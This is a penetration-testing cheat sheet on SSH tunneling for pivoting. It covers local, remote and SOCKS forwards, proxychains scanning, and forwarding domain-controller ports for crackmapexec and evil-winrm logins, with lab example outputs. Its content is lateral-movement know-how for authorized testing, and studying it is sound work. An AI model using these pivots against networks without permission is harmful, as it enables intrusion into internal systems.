# SSH TUNNELING

### Local port forward

```bash
ssh -L 8080:INTERNAL_TARGET:80 user@PIVOT_HOST
```

> Access internal:80 via your localhost:8080

**Why:** Browse internal web apps

<details>
<summary>Example Output</summary>

```
ssh -L 8080:172.16.1.10:80 john@10.10.14.5

Now browse: http://127.0.0.1:8080
(You see internal web app on 172.16.1.10:80)
```
</details>

---

### Remote port forward

```bash
ssh -R 9090:127.0.0.1:80 user@ATTACKER_IP
```

> Make your port accessible from pivot

**Why:** Expose your tools to internal net

<details>
<summary>Example Output</summary>

```
ssh -R 9090:127.0.0.1:80 attacker@10.10.14.2

On attacker: curl http://127.0.0.1:9090
(Access pivot's localhost:80 from your machine)
```
</details>

---

### Dynamic SOCKS proxy

```bash
ssh -D 1080 user@PIVOT_HOST
```

> SOCKS proxy through pivot

**Why:** Route any tool through pivot

<details>
<summary>Example Output</summary>

```
ssh -D 1080 john@10.10.14.5

Edit /etc/proxychains4.conf:
socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 172.16.1.10
(Scan internal network through pivot)
```
</details>

---

### Use SOCKS proxy

```bash
proxychains nmap -sT -Pn INTERNAL_TARGET
proxychains crackmapexec smb INTERNAL_TARGET
```

> Prepend proxychains to any command

**Why:** Edit /etc/proxychains4.conf: socks5 127.0.0.1 1080

<details>
<summary>Example Output</summary>

```
proxychains nmap -sT -Pn 172.16.1.10
ProxyChains | S-chain |->127.0.0.1:1080

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds
(Scanning internal network through pivot)
```
</details>

---

### SSH with key + tunnel

```bash
ssh -i id_rsa -L 445:DC_IP:445 -L 5985:DC_IP:5985 user@PIVOT
```

> Multiple port forwards at once

**Why:** Forward several services

<details>
<summary>Example Output</summary>

```
ssh -i id_rsa -L 445:172.16.1.10:445 -L 5985:172.16.1.10:5985 john@10.10.10.5

Now on attacker:
crackmapexec smb 127.0.0.1 -u admin -p Pass
evil-winrm -i 127.0.0.1 -u admin -p Pass
(Multiple internal ports forwarded at once)
```
</details>

---

### Persistent SSH tunnel

```bash
ssh -fNT -L 8080:INTERNAL:80 user@PIVOT
```

> Background tunnel

**Why:** -f background, -N no commands, -T no TTY

<details>
<summary>Example Output</summary>

```
ssh -fNT -L 8080:172.16.1.10:80 john@10.10.10.5

(Returns to prompt, tunnel runs in background)
curl http://127.0.0.1:8080
(Access internal web app while working)
```
</details>

---
